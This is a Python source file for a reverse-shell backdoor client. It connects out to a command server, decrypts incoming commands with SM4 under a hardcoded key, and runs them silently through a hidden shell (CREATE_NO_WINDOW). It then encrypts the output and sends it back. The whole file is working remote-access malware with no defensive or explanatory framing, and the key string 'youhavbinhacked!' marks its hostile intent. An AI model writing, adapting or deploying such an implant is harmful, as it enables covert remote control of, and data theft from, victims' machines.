import subprocess
import socket
import threading
import os
from gmssl.sm4 import CryptSM4, SM4_ENCRYPT, SM4_DECRYPT
####################################################
server_address=('localhost',6667)
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
secret_key='youhavbinhacked!'.encode()#encode
crypt_sm4=CryptSM4()
####################################################
#SM4加密
def SM4_encrypt(plaintext,secret_key=secret_key,crypt_sm4=crypt_sm4):
    #encode
    plaintext=plaintext.encode()
    #加密
    crypt_sm4.set_key(secret_key, SM4_ENCRYPT)
    ciphertext = crypt_sm4.crypt_ecb(plaintext)
    #返回
    return ciphertext
def SM4_decrypt(ciphertext,secret_key=secret_key,crypt_sm4=crypt_sm4):
    #解密
    crypt_sm4.set_key(secret_key, SM4_DECRYPT)
    decrypted_text = crypt_sm4.crypt_ecb(ciphertext)
    #decode
    decrypted_text=decrypted_text.decode()
    #返回
    return decrypted_text
####################################################
#指令服务
def cmd(command):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
    stdout, stderr = process.communicate()
    return_code = process.returncode
    data_return='[client]\n'+f"Return code: {return_code}\n"+f"Standard output:\n{stdout}\n"+ f"Standard error:\n{stderr}\n"
    return data_return
####################################################
#第一步，连接服务器
def make_connection():
    while True:
        try:
            print('trying')
            client_socket.connect(server_address)
            break
        except:
            #time.sleep(5)  # 等待5秒后重试\
            continue
    return 1
#第二步，构建服务
def service_start():
    while True:
        data_recv=client_socket.recv(4096)
        data=SM4_decrypt(data_recv)
        print(data)
        #指令服务
        if data[:4]=='/cmd':
            command=data[5:]
            rtn=cmd(command)
        else:
            rtn='0'
        #
        print(rtn)
        data_send=SM4_encrypt(rtn)
        client_socket.send(data_send)
        #
        
        
####################################################
make_connection()
service_start()
